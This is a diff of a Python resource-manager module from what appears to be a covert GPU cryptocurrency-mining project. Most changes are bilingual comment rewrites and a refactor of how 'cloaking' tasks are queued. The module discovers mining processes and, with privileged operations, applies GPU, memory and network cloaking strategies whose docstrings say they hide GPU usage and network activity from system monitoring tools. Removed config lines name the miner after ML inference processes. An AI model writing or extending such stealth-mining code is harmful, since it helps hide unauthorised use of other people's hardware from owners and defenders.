@@ -1,10 +1,13 @@
 """
-Module resource_manager.py - Quản lý tài nguyên GPU theo mô hình đồng bộ (threading).
-Sau khi refactor, module này:
-- BỎ toàn bộ cơ chế giám sát (nhiệt độ, công suất) & watchers.
-- BỎ cơ chế restore hoàn toàn.
-- Khi start, tự động khám phá tiến trình và CLOAK luôn.
-- Chỉ hỗ trợ cloaking, không có restoration.
+**Resource Manager Module** (module quản lý tài nguyên - điều phối và tối ưu hóa GPU resources)
+
+**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU) theo **threading model** (mô hình đa luồng).
+
+**Post-Refactor Architecture** (kiến trúc sau tái cấu trúc):
+- **Monitoring System Removal** (loại bỏ hệ thống giám sát) - nhiệt độ, công suất & watchers
+- **Restoration Mechanism Removal** (loại bỏ cơ chế khôi phục) - không hỗ trợ restore
+- **Auto Discovery & Cloaking** (tự động khám phá & che giấu) - phát hiện và cloak processes ngay khi start
+- **Cloaking-Only Mode** (chế độ chỉ che giấu) - không có restoration capabilities
 """
 
 import logging
@@ -20,100 +23,122 @@ from typing import List, Any, Dict, Optional
 from itertools import count
 from pathlib import Path
 
-# Các import liên quan đến dự án
+# **Project-Specific Imports** (imports đặc thù dự án - các module core của mining environment)
 from mining_environment.scripts.utils import MiningProcess
 from mining_environment.scripts.resource_control import ResourceControlFactory, CloakStrategyFactory
 from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
 from mining_environment.scripts.auxiliary_modules.models import ConfigModel
-# 🗑️ EventBus import removed - using DirectPIDRegistry instead
+# 🗑️ **EventBus Import Removed** (loại bỏ import EventBus - thay thế bằng DirectPIDRegistry)
 from mining_environment.scripts.privileged_operations import get_privileged_manager
 from mining_environment.scripts.unified_logging import get_unified_logger
 from mining_environment.scripts.error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
-# ✅ MODULE-LEVEL LOGGER: Create module-level logger for @classmethod usage
+# ✅ **MODULE-LEVEL LOGGER** (logger cấp module - tạo logger ở module level cho @classmethod usage)
 module_logger = get_unified_logger('resource_manager')
 
-# ✅ INTELLIGENT CACHING: Use advanced strategy cache system
+# ✅ **INTELLIGENT CACHING** (bộ nhớ đệm thông minh - sử dụng hệ thống cache chiến lược nâng cao)
 from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy
 
 class SharedResourceManager:
     """
-    Lớp quản lý tài nguyên GPU.
-    - Khởi tạo/tắt NVML
-    - Đọc GPU usage, cache usage
-    - Áp dụng CloakStrategy cho tiến trình
+    **Shared Resource Manager Class** (lớp quản lý tài nguyên chia sẻ)
+    
+    **GPU Resource Management** (quản lý tài nguyên GPU) với **NVML Integration** (tích hợp NVML):
+    - **NVML Lifecycle Management** (quản lý vòng đời NVML) - khởi tạo/tắt NVML safely
+    - **GPU Usage Monitoring** (giám sát sử dụng GPU) - đọc GPU usage và cache usage
+    - **Cloaking Strategy Application** (áp dụng chiến lược che giấu) - apply CloakStrategy cho processes
+    
+    **Shared Architecture** (kiến trúc chia sẻ) - được sử dụng bởi multiple ResourceManager instances.
     """
 
     def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
-        # ✅ UNIFIED: Use unified logger for consistent logging
+        # ✅ **UNIFIED LOGGING** (ghi log thống nhất - sử dụng unified logger cho consistent logging across system)
         self.logger = get_unified_logger('resource_manager')
         self.config = config
         self.resource_managers = resource_managers
-        # ✅ INTELLIGENT CACHING: Replace simple dict with intelligent cache system
+        # ✅ **INTELLIGENT CACHING SYSTEM** (hệ thống bộ nhớ đệm thông minh - thay thế dict đơn giản bằng intelligent cache)
         self.strategy_cache = get_strategy_cache(
-            max_size=500,  # Reasonable size for strategy objects
-            ttl_seconds=7200.0,  # 2 hours TTL for strategy objects
+            max_size=500,  # **Reasonable Cache Size** (kích thước cache hợp lý - cho strategy objects)
+            ttl_seconds=7200.0,  # **TTL Configuration** (cấu hình TTL - 2 tiếng cho strategy objects)
             eviction_policy=CacheEvictionPolicy.INTELLIGENT
         )
         
-        # ✅ CACHE METRICS: Track cache performance
-        self.cache_metrics_interval = 300  # 5 minutes
+        # ✅ **CACHE METRICS TRACKING** (theo dõi metrics bộ nhớ đệm - track cache performance cho optimization)
+        self.cache_metrics_interval = 300  # **Metrics Interval** (khoảng cách metrics - 5 phút)
         self.last_cache_metrics_log = time.time()
         
-        # Khởi tạo PrivilegedOperationManager (singleton)
+        # **Privileged Operation Manager Initialization** (khởi tạo quản lý thao tác đặc quyền - singleton pattern)
         self.privileged_manager = get_privileged_manager(logger)
         
-        # Kiểm tra security context
+        # **Security Context Validation** (xác thực ngữ cảnh bảo mật - kiểm tra user permissions và root access)
         security_context = self.privileged_manager.validate_security_context()
         self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")
 
         self._nvml_init = False
         try:
             self.initialize_nvml()
-            self.logger.info("SharedResourceManager khởi tạo OK.")
+            self.logger.info("✅ **SharedResourceManager** khởi tạo thành công - GPU resource management sẵn sàng")
         except Exception as e:
-            self.logger.error(f"Lỗi init SharedResourceManager: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"❌ **SharedResourceManager Initialization Failed** (khởi tạo SharedResourceManager thất bại): {e}\n{traceback.format_exc()}")
             raise
 
     def is_nvml_initialized(self) -> bool:
         return self._nvml_init
 
     def initialize_nvml(self):
-        """**Thread-safe NVML initialization** (khởi tạo NVML an toàn luồng) với **threading-based timeout** (thời gian chờ dựa trên luồng)"""
+        """
+        **Thread-Safe NVML Initialization** (khởi tạo NVML an toàn luồng)
+        
+        Thực hiện khởi tạo **NVIDIA Management Library** (thư viện quản lý NVIDIA) với
+        **threading-based timeout** (thời gian chờ dựa trên luồng) để tránh system hangs.
+        
+        **Safety Features** (tính năng an toàn):
+        - **ThreadPoolExecutor** với configurable timeout
+        - **Thread-safe execution** (thực thi an toàn luồng)
+        - **Graceful fallback** (fallback duyên dáng) khi NVML không khả dụng
+        
+        Note:
+            Method này được gọi automatically trong __init__ và có thể retry safely.
+        """
         if not self._nvml_init:
             try:
-                # ✅ FIXED: Thread-safe NVML initialization với concurrent.futures timeout
-                self.logger.debug("Thread-safe NVML initialization...")
+                # ✅ **THREAD-SAFE NVML INIT** (khởi tạo NVML an toàn luồng - sử dụng concurrent.futures timeout)
+                self.logger.debug("🔍 **Thread-Safe NVML Init** (khởi tạo NVML an toàn luồng) - starting initialization process")
                 
-                # ✅ THREADING-BASED TIMEOUT: Safer for multi-threading environment
+                # ✅ **THREADING-BASED TIMEOUT** (thời gian chờ dựa trên luồng - an toàn hơn cho môi trường đa luồng)
                 import time
                 
                 def nvml_init_worker():
-                    """Worker function for NVML initialization"""
+                    """
+                    **NVML Initialization Worker** (worker khởi tạo NVML)
+                    
+                    **Isolated Worker Function** (hàm worker cô lập) thực hiện NVML init
+                    trong **separate thread** (luồng riêng biệt) để avoid blocking main thread.
+                    """
                     try:
                         pynvml.nvmlInit()
                         return True
                     except Exception as e:
-                        self.logger.debug(f"NVML init worker exception: {e}")
+                        self.logger.debug(f"❌ **NVML Worker Exception** (ngoại lệ worker NVML): {e}")
                         raise
                 
-                # ✅ THREAD-SAFE: Use ThreadPoolExecutor với timeout
+                # ✅ **THREAD-SAFE EXECUTION** (thực thi an toàn luồng - sử dụng ThreadPoolExecutor với timeout)
                 with concurrent.futures.ThreadPoolExecutor(max_workers=1, thread_name_prefix="NVML_Init") as executor:
                     future = executor.submit(nvml_init_worker)
                     
                     try:
-                        # ✅ CONFIGURABLE TIMEOUT: 3-second timeout for NVML init
+                        # ✅ **CONFIGURABLE TIMEOUT** (thời gian chờ có thể cấu hình - 3 giây timeout cho NVML init)
                         result = future.result(timeout=3.0)
                         self._nvml_init = True
-                        self.logger.info("✅ NVML đã được khởi tạo thành công (thread-safe mode)")
+                        self.logger.info("✅ **NVML Initialization Success** (khởi tạo NVML thành công) - thread-safe mode active")
                         
                     except concurrent.futures.TimeoutError:
-                        self.logger.warning("⏰ NVML initialization timeout after 3s - continuing without GPU support")
+                        self.logger.warning("⏰ **NVML Initialization Timeout** (khởi tạo NVML quá thời gian) - timeout 3s, tiếp tục without GPU support")
                         future.cancel()  # Cancel the running task
                         self._nvml_init = False
                     
             except Exception as e:
-                self.logger.warning(f"❌ NVML initialization failed: {e} - continuing without GPU support")
+                self.logger.warning(f"❌ **NVML Initialization Failed** (khởi tạo NVML thất bại): {e} - tiếp tục without GPU support")
                 self._nvml_init = False
 
     def shutdown_nvml(self):
@@ -121,13 +146,27 @@ class SharedResourceManager:
             try:
                 pynvml.nvmlShutdown()
                 self._nvml_init = False
-                self.logger.debug("Đã shutdown NVML thành công.")
+                self.logger.debug("✅ **NVML Shutdown Success** (tắt NVML thành công) - GPU resources properly released")
             except pynvml.NVMLError as e:
-                self.logger.error(f"Lỗi khi shutdown NVML: {e}")
+                self.logger.error(f"❌ **NVML Shutdown Error** (lỗi tắt NVML): {e}")
 
     def get_process_cache_usage(self, pid: int) -> float:
         """
-        Đọc /proc/[pid]/status => VmCache => tính % so với total RAM.
+        **Process Cache Usage Analysis** (phân tích sử dụng cache tiến trình)
+        
+        Đọc thông tin cache từ **proc filesystem** (hệ thống file proc) và tính toán
+        **cache usage percentage** (phần trăm sử dụng cache) so với total system RAM.
+        
+        **Implementation Details** (chi tiết triển khai):
+        - Đọc `/proc/[pid]/status` → **VmCache field** (trường VmCache)
+        - Tính **percentage** (phần trăm) so với **total RAM** (tổng RAM hệ thống)
+        - **Error handling** (xử lý lỗi) cho missing processes và file access
+        
+        Args:
+            pid: **Process ID** (ID tiến trình) cần phân tích cache usage
+            
+        Returns:
+            float: **Cache usage percentage** (phần trăm sử dụng cache) của process
         """
         try:
             status_file = f"/proc/{pid}/status"
@@ -137,15 +176,15 @@ class SharedResourceManager:
                         cache_kb = int(line.split()[1])
                         total_mem_kb = psutil.virtual_memory().total / 1024
                         cache_percent = (cache_kb / total_mem_kb) * 100
-                        self.logger.debug(f"PID={pid} sử dụng cache: {cache_percent:.2f}%")
+                        self.logger.debug(f"📊 **Cache Usage Analysis** (phân tích sử dụng cache) - PID={pid}: {cache_percent:.2f}%")
                         return cache_percent
-            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
+            self.logger.warning(f"⚠️ **VmCache Field Missing** (thiếu trường VmCache) - không tìm thấy cho PID={pid}")
             return 0.0
         except FileNotFoundError:
-            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
+            self.logger.error(f"❌ **Process Not Found** (không tìm thấy tiến trình) - PID={pid} không tồn tại khi lấy cache info")
             return 0.0
         except Exception as e:
-            self.logger.error(f"Lỗi get_process_cache_usage(PID={pid}): {e}\n{traceback.format_exc()}")
+            self.logger.error(f"❌ **Cache Usage Analysis Error** (lỗi phân tích cache usage) - PID={pid}: {e}\n{traceback.format_exc()}")
             return 0.0
 
     def get_gpu_usage_percent(self, pid: int) -> float:
@@ -179,20 +218,37 @@ class SharedResourceManager:
 
             return total_gpu_usage if gpu_present else 0.0
         except pynvml.NVMLError as e:
-            self.logger.error(f"Lỗi khi thu thập GPU usage: {e}")
+            self.logger.error(f"❌ **GPU Usage Collection Error** (lỗi thu thập sử dụng GPU): {e}")
             return 0.0
         except Exception as e:
-            self.logger.error(f"Lỗi không xác định trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
+            self.logger.error(f"❌ **Unexpected GPU Usage Error** (lỗi GPU usage không xác định) trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
             return 0.0
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
-        Áp dụng chiến lược cloak cho một tiến trình cụ thể.
+        **Cloaking Strategy Application** (áp dụng chiến lược che giấu)
+        
+        Áp dụng **specific cloaking strategy** (chiến lược che giấu cụ thể) cho một
+        **target mining process** (tiến trình khai thác mục tiêu) để ẩn GPU usage khỏi
+        system monitoring tools.
+        
+        **Strategy Support** (hỗ trợ chiến lược):
+        - **GPU Cloaking** (che giấu GPU) - ẩn GPU utilization
+        - **Memory Cloaking** (che giấu bộ nhớ) - với coordination support
+        - **Network Cloaking** (che giấu mạng) - ẩn network activity
+        - **Coordinated Cloaking** (che giấu có phối hợp) - với hook recovery
+        
+        Args:
+            strategy_name: **Strategy name** (tên chiến lược) - 'gpu_cloaking', 'memory', 'network'
+            process: **MiningProcess object** (đối tượng MiningProcess) cần apply cloaking
+            
+        Note:
+            Method tự động inject **PrivilegedManager** (quản lý đặc quyền) nếu strategy cần.
         """
         try:
             pid = process.pid
             name = process.name
-            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
+            self.logger.debug(f"🎯 **Strategy Creation** (tạo chiến lược) - '{strategy_name}' cho {name} (PID={pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
@@ -200,16 +256,16 @@ class SharedResourceManager:
                 self.resource_managers
             )
             if not strategy or not callable(getattr(strategy, 'apply', None)):
-                self.logger.error(f"Chiến lược '{strategy_name}' không khả dụng.")
+                self.logger.error(f"❌ **Strategy Not Available** (chiến lược không khả dụng) - '{strategy_name}' không được hỗ trợ")
                 return
 
-            # Inject privileged_manager nếu strategy cần
+            # **Privileged Manager Injection** (tiêm quản lý đặc quyền - inject nếu strategy cần)
             if hasattr(strategy, 'set_privileged_manager'):
                 strategy.set_privileged_manager(self.privileged_manager)
 
-            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
+            self.logger.info(f"🚀 **Strategy Application Start** (bắt đầu áp dụng chiến lược) - '{strategy_name}' cho {name} (PID={pid})")
             
-            # **COORDINATED CLOAKING**: Use coordination for memory strategy (che giấu có phối hợp cho chiến lược bộ nhớ)
+            # **COORDINATED CLOAKING** (che giấu có phối hợp - sử dụng coordination cho memory strategy)
             if strategy_name == 'memory' and hasattr(strategy, 'apply_with_coordination'):
                 try:
                     # **Import coordinator** (nhập điều phối viên)
@@ -243,27 +299,36 @@ class SharedResourceManager:
                 # **Standard strategy application** (áp dụng chiến lược tiêu chuẩn)
                 strategy.apply(process)
                 
-            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
+            self.logger.info(f"✅ **Strategy Application Complete** (hoàn thành áp dụng chiến lược) - '{strategy_name}' cho {name} (PID={pid})")
 
             # ✅ REMOVED: CPU support completely removed
 
         except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại: {e}")
+            self.logger.error(f"❌ **Process Not Found** (tiến trình không tồn tại): {e}")
         except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
+            self.logger.error(f"❌ **Access Denied** (không đủ quyền) - áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
         except Exception as e:
             self.logger.error(
-                f"Lỗi cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
+                f"❌ **Cloaking Strategy Error** (lỗi chiến lược cloaking) - '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
 class ResourceManager(IResourceManager):
     """
-    Lớp ResourceManager chỉ còn chức năng:
-    - Khởi tạo SharedResourceManager
-    - Khám phá tiến trình (duy nhất 1 lần) và Cloak tất cả
-    - Không giám sát, không restore
-    - **PHASE 2**: Enhanced với Readiness Signaling System
+    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
+    
+    **Simplified Architecture** (kiến trúc đơn giản hóa) sau refactor với core functionality:
+    - **SharedResourceManager Initialization** (khởi tạo SharedResourceManager) - GPU resource management
+    - **Process Discovery & Cloaking** (khám phá & che giấu tiến trình) - một lần discovery và cloak tất cả
+    - **No Monitoring or Restoration** (không giám sát hay khôi phục) - cloaking-only mode
+    
+    **PHASE 2 Enhancements** (cải tiến PHASE 2):
+    - **Readiness Signaling System** (hệ thống tín hiệu sẵn sàng) - eliminate race conditions
+    - **Enhanced Hook Coordination** (phối hợp hook nâng cao) - với recovery mechanisms
+    - **Progressive Memory Management** (quản lý bộ nhớ tiên tiến) - prevent std::bad_alloc
+    - **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry) - thay thế EventBus
+    
+    **Thread-Safe Singleton** (singleton an toàn luồng) với proper initialization control.
     """
 
     _instance = None
@@ -282,9 +347,9 @@ class ResourceManager(IResourceManager):
         with cls._instance_lock:
             if cls._instance is None:
                 cls._instance = super(ResourceManager, cls).__new__(cls)
-                # ✅ CLEAN ARCHITECTURE: NO attribute initialization here
-                # All attributes will be initialized in __init__ method
-                module_logger.debug("ResourceManager singleton instance created (clean creation)")
+                # ✅ **CLEAN ARCHITECTURE** (kiến trúc sạch - KHÔNG khởi tạo attributes ở đây)
+                # **All Attributes Init in __init__** (tất cả attributes sẽ được init trong __init__ method)
+                module_logger.debug("🎯 **ResourceManager Singleton Created** (tạo ResourceManager singleton) - clean creation pattern")
         return cls._instance
 
     def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
@@ -295,13 +360,13 @@ class ResourceManager(IResourceManager):
         Includes _creation_time và other instance attributes moved from __new__.
         """
         if getattr(self, '_initialized', False):
-            # **Singleton already initialized** (singleton đã khởi tạo)
-            module_logger.debug(f"ResourceManager singleton accessed (already initialized)")
+            # **Singleton Already Initialized** (singleton đã khởi tạo - tránh duplicate initialization)
+            module_logger.debug("🔄 **ResourceManager Singleton Accessed** (truy cập ResourceManager singleton) - already initialized")
             return
 
         self._initialized = True
-        # ✅ CLEAN ARCHITECTURE: ALL attribute initialization trong __init__
-        self._creation_time = time.time()  # Moved from __new__ method
+        # ✅ **CLEAN ARCHITECTURE** (kiến trúc sạch - TẤT CẢ attribute initialization trong __init__)
+        self._creation_time = time.time()  # **Creation Time** (thời gian tạo - moved from __new__ method)
         self._init_time = time.time()
         module_logger.debug(f"ResourceManager initialization started với clean architecture")
         
@@ -435,27 +500,24 @@ class ResourceManager(IResourceManager):
     
     def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
         """
-        ✅ NEW: Comprehensive configuration validation với detailed error reporting
+        **Configuration Validation** (xác thực cấu hình – kiểm tra thông số hệ thống GPU mining)
         
-        :param config: Configuration to validate
-        :return: Validated configuration
-        :raises: ValueError if configuration is invalid
+        Thực hiện validation cho **GPU mining configuration** đảm bảo có đầy đủ **cloaking strategies** 
+        và **proper config object structure** cho ResourceManager operations.
+        
+        Args:
+            config: **ConfigModel** (mô hình cấu hình – object chứa GPU mining parameters)
+            
+        Returns:
+            **ConfigModel**: **Validated configuration** (cấu hình đã xác thực – config với proper cloaking strategies)
+            
+        Raises:
+            ValueError: Khi **critical validation** (xác thực quan trọng – kiểm tra cloaking strategies) thất bại
         """
         try:
-            self.logger.info("🔍 Validating ResourceManager configuration...")
+            self.logger.info("🔍 Đang thực hiện **Configuration Validation** (xác thực cấu hình GPU mining)...")
             
-            # ✅ VALIDATION 1: Check process priority map
-            if not hasattr(config, 'process_priority_map'):
-                self.logger.warning("⚠️ Missing process_priority_map - using defaults")
-                config.process_priority_map = {'ml-inference': 1, 'inference-cuda': 2}
-            
-            # ✅ VALIDATION 2: Validate priority values
-            for process_name, priority in config.process_priority_map.items():
-                if not isinstance(priority, int) or priority < 1:
-                    self.logger.warning(f"⚠️ Invalid priority for '{process_name}': {priority} - setting to 1")
-                    config.process_priority_map[process_name] = 1
-            
-            # ✅ VALIDATION 3: Check cloaking strategies configuration
+            # ✅ **VALIDATION 1** (xác thực 1): **Cloaking Strategies Setup** (thiết lập chiến lược che giấu)
             cloaking_strategies = getattr(config, 'cloaking_strategies', None)
             if not cloaking_strategies:
                 self.logger.warning("⚠️ No cloaking strategies configured - using defaults")
@@ -471,7 +533,7 @@ class ResourceManager(IResourceManager):
                     # Fallback: set attribute directly
                     setattr(config, 'cloaking_strategies', default_strategies)
             
-            # ✅ VALIDATION 4: Validate strategy configurations
+            # ✅ **VALIDATION 2** (xác thực 2): **Strategy Configuration Verification** (xác minh cấu hình chiến lược)
             if cloaking_strategies:
                 required_strategies = ['gpu_cloaking']  # GPU-only mode
                 for strategy in required_strategies:
@@ -483,7 +545,7 @@ class ResourceManager(IResourceManager):
                         self.logger.warning(f"⚠️ Invalid configuration for strategy '{strategy}' - resetting")
                         cloaking_strategies[strategy] = {'enabled': True}
             
-            # ✅ VALIDATION 5: Configuration method support check
+            # ✅ **VALIDATION 3** (xác thực 3): **Config Method Support** (hỗ trợ phương thức config)
             if not hasattr(config, 'get'):
                 self.logger.warning("⚠️ Config missing 'get' method - adding wrapper")
                 original_config = config
@@ -500,17 +562,16 @@ class ResourceManager(IResourceManager):
                 
                 config = ConfigWrapper(original_config)
             
-            self.logger.info("✅ Configuration validation completed successfully")
+            self.logger.info("✅ **Configuration Validation** (xác thực cấu hình) hoàn tất thành công")
             
-            # ✅ LOG CONFIGURATION SUMMARY
-            priority_count = len(getattr(config, 'process_priority_map', {}))
+            # ✅ **CONFIGURATION SUMMARY** (tóm tắt cấu hình) - updated metrics
             strategy_count = len(getattr(config, 'cloaking_strategies', {}))
-            self.logger.info(f"📋 Configuration summary: {priority_count} process priorities, {strategy_count} cloaking strategies")
+            self.logger.info(f"📋 **Configuration Summary** (tóm tắt cấu hình): {strategy_count} **cloaking strategies** (chiến lược che giấu)")
             
             return config
             
         except Exception as e:
-            error_msg = f"❌ Configuration validation failed: {e}"
+            error_msg = f"❌ **Configuration Validation** (xác thực cấu hình) thất bại: {e}"
             self.logger.error(error_msg)
             raise ValueError(error_msg) from e
 
@@ -636,8 +697,8 @@ class ResourceManager(IResourceManager):
                             else:
                                 self.logger.info(f"📋 Mining process already tracked: PID={pid}")
                         
-                        # **Trigger immediate plugin activation** (kích hoạt plugin tức thì)
-                        self._trigger_immediate_cloaking(mining_process)
+                        # **Trigger immediate cloaking via unified method** (kích hoạt cloaking tức thì qua phương thức thống nhất)
+                        self.trigger_cloaking(mining_process, 'direct_registry', urgent=True)
                         
                     except Exception as tracking_err:
                         self.logger.error(f"❌ Failed to add mining process to tracking: {tracking_err}")
@@ -661,104 +722,201 @@ class ResourceManager(IResourceManager):
                 ErrorSeverity.HIGH
             )
     
-    def _trigger_immediate_cloaking(self, mining_process) -> None:
+    def _create_unified_cloaking_task(self, process: MiningProcess, 
+                                    source: str, urgent: bool = False,
+                                    coordination_data: Dict = None) -> tuple:
         """
-        🚀 **PHASE 1: Enhanced Immediate Cloaking với Hook Recovery** (kích hoạt cloaking tức thì nâng cao với khôi phục hook)
+        **Create Unified Task Format** (tạo định dạng task thống nhất)
         
-        **PHASE 1 IMPLEMENTATION**: Enhanced error recovery và retry mechanism với fallback cloaking.
-        Giải quyết vấn đề hook coordination timeout bằng progressive recovery strategy.
+        UNIFIED SOLUTION: Single task format cho tất cả cloaking paths.
+        Replaces duplicate formats từ _trigger_immediate_cloaking() và enqueue_cloaking().
         
         Args:
-            mining_process: MiningProcess object cần apply cloaking
+            process: MiningProcess object cần apply cloaking
+            source: Nguồn request ('direct_registry', 'discovery', 'file_scanner')
+            urgent: True cho immediate cloaking, False cho standard cloaking
+            coordination_data: Metadata từ hook coordination (nếu có)
+            
+        Returns:
+            tuple: (priority, timestamp, task_data) for queue
+        """
+        
+        task_data = {
+            'type': 'cloaking',                    # **UNIFIED FIELD NAME** (tên trường thống nhất)
+            'action': 'immediate_cloak' if urgent else 'standard_cloak',
+            'process': process,
+            'source': source,                      # 'direct_registry', 'discovery', 'file_scanner'
+            'urgent': urgent,
+            'strategies': self._determine_strategies(process),
+            'coordination_status': coordination_data.get('success', False) if coordination_data else False,
+            'fallback_mode': not coordination_data.get('success', True) if coordination_data else False,
+            'memory_safe': coordination_data.get('memory_safe', False) if coordination_data else False,
+            'coordination_method': coordination_data.get('method', 'none') if coordination_data else 'none',
+            'retry_count': coordination_data.get('retry_count', 0) if coordination_data else 0
+        }
+        
+        priority = 0 if urgent else process.priority
+        return (priority, time.time(), task_data)
+    
+    def _determine_strategies(self, process: MiningProcess) -> List[str]:
+        """
+        **Determine Strategies for Process** (xác định chiến lược cho tiến trình)
+        
+        Intelligent strategy selection dựa trên process type và system capabilities.
+        
+        Args:
+            process: MiningProcess object
+            
+        Returns:
+            List[str]: Ordered list of strategy names
         """
         try:
-            pid = mining_process.pid
-            self.logger.info(f"🚀 [PHASE1] Starting enhanced immediate cloaking với recovery cho PID {pid}")
+            # **Base strategies for GPU processes** (chiến lược cơ bản cho tiến trình GPU)
+            base_strategies = ['gpu_cloaking', 'network', 'memory']
             
-            # **PHASE 1: Enhanced Hook Coordinator Integration với Recovery** (tích hợp coordinator nâng cao với khôi phục)
-            coordinator_result = self._attempt_hook_coordination_with_recovery(pid)
-            
-            if coordinator_result['success']:
-                self.logger.info(f"✅ [PHASE1-SUCCESS] Hook coordination successful cho PID {pid} - proceeding với coordinated cloaking")
-                coordination_method = coordinator_result['method']
-                self.logger.info(f"🔧 [PHASE1-METHOD] Coordination achieved via: {coordination_method}")
-            else:
-                self.logger.warning(f"⚠️ [PHASE1-FALLBACK] Hook coordination failed cho PID {pid} - activating fallback cloaking mode")
-                fallback_reason = coordinator_result['reason']
-                self.logger.warning(f"💡 [PHASE1-REASON] Fallback reason: {fallback_reason}")
-                
-                # **PHASE 1: Decision point** - proceed với fallback instead of abort
-                if self._should_use_fallback_cloaking(pid, coordinator_result):
-                    self.logger.info(f"✅ [PHASE1-DECISION] Fallback cloaking approved cho PID {pid}")
+            # **Filter available strategies** (lọc chiến lược khả dụng)
+            available_strategies = []
+            for strategy in base_strategies:
+                if self._is_strategy_available(strategy):
+                    available_strategies.append(strategy)
                 else:
-                    self.logger.error(f"🚨 [PHASE1-ABORT] Cloaking deemed unsafe, aborting cho PID {pid}")
-                    return
+                    self.logger.debug(f"🚫 [UNIFIED] Strategy '{strategy}' not available, skipping")
             
-            # **PHASE 1: Proceed với appropriate cloaking mode** (tiến hành với chế độ cloaking phù hợp)
-            cloaking_mode = 'coordinated' if coordinator_result['success'] else 'fallback'
-            self.logger.info(f"🔒 [PHASE1-EXECUTE] Starting {cloaking_mode} immediate cloaking cho PID {pid}")
+            # **Ensure at least one strategy** (đảm bảo ít nhất một chiến lược)
+            if not available_strategies:
+                self.logger.warning(f"⚠️ [UNIFIED] No strategies available - using fallback")
+                available_strategies = ['network']  # Safe fallback
             
-            # **PHASE 1: Create enhanced cloaking task với coordination metadata** (tạo nhiệm vụ cloaking nâng cao với metadata coordination)
-            cloaking_task = (
-                0,  # Highest priority
-                time.time(),  # Timestamp
-                {
-                    'action': 'immediate_cloak',
-                    'process': mining_process,
-                    'source': 'direct_registry',
-                    'urgent': True,
-                    # **PHASE 1: Enhanced metadata** (metadata nâng cao)
-                    'coordination_status': coordinator_result['success'],
-                    'coordination_method': coordinator_result.get('method', 'none'),
-                    'fallback_mode': not coordinator_result['success'],
-                    'memory_safe': coordinator_result.get('memory_safe', False),
-                    'retry_count': coordinator_result.get('retry_count', 0)
-                }
-            )
-            
-            # **PHASE 1: Enqueue với enhanced tracking** (xếp hàng với theo dõi nâng cao)
-            self.resource_adjustment_queue.put(cloaking_task)
-            self.logger.info(f"⚡ [PHASE1-QUEUED] Enhanced cloaking task queued cho PID {pid} (mode: {cloaking_mode})")
-            
-            # **Optional: Force process discovery refresh** (tùy chọn: buộc làm mới khám phá tiến trình)
-            if hasattr(self, 'shared_resource_manager'):
-                try:
-                    # **Manual process discovery trigger** (kích hoạt khám phá tiến trình thủ công)
-                    self.logger.debug(f"🔍 [IMMEDIATE-CLOAKING] Triggering process discovery refresh")
-                    # Note: Actual discovery implementation would be called here
-                except Exception as discovery_err:
-                    self.logger.warning(f"⚠️ [IMMEDIATE-CLOAKING] Process discovery refresh failed: {discovery_err}")
-            
-            self.logger.info(f"✅ [IMMEDIATE-CLOAKING] Immediate cloaking activation completed for PID {mining_process.pid}")
+            return available_strategies
             
         except Exception as e:
-            self.logger.error(f"❌ [PHASE1-ERROR] Failed to trigger immediate cloaking: {e}")
-            # **PHASE 1: Enhanced error handling** (xử lý lỗi nâng cao) - attempt emergency fallback
-            self._attempt_emergency_fallback_cloaking(mining_process, str(e))
+            self.logger.error(f"❌ [UNIFIED] Error determining strategies: {e}")
+            return ['network']  # Safe fallback
+    
+    def _enqueue_with_deduplication(self, task: tuple) -> bool:
+        """
+        **Enqueue Task with PID Deduplication** (xếp hàng task với khử trùng lặp PID)
+        
+        UNIFIED SOLUTION: Single entry point với PID-based deduplication.
+        Prevents duplicate processing của cùng PID từ multiple sources.
+        
+        Args:
+            task: Task tuple (priority, timestamp, task_data)
+            
+        Returns:
+            bool: True nếu task được enqueued successfully
+        """
+        try:
+            _, _, task_data = task
+            pid = task_data['process'].pid
+            source = task_data['source']
+            
+            # **Check if PID already in queue or processing** (kiểm tra PID đã trong hàng đợi hoặc đang xử lý)
+            with self.mining_processes_lock:
+                current_state = self.process_states.get(pid)
+                
+                if current_state in ['cloaking', 'cloaked']:
+                    self.logger.info(f"🚫 [DEDUP] PID {pid} already {current_state}, skipping từ {source}")
+                    return False
+                
+                # **Mark as cloaking to prevent duplicates** (đánh dấu đang cloaking để tránh trùng lặp)
+                self.process_states[pid] = 'cloaking'
+                self.resource_adjustment_queue.put(task)
+                
+                action = task_data['action']
+                urgent = task_data['urgent']
+                coordination_status = task_data['coordination_status']
+                
+                self.logger.info(f"✅ [UNIFIED] Enqueued PID {pid} từ {source}")
+                self.logger.info(f"🎯 [UNIFIED] Action: {action}, Urgent: {urgent}, Coordinated: {coordination_status}")
+                self.logger.info(f"🔧 [UNIFIED] Strategies: {task_data['strategies']}")
+                
+                return True
+                
+        except Exception as e:
+            self.logger.error(f"❌ [UNIFIED] Failed to enqueue with deduplication: {e}")
+            return False
+    
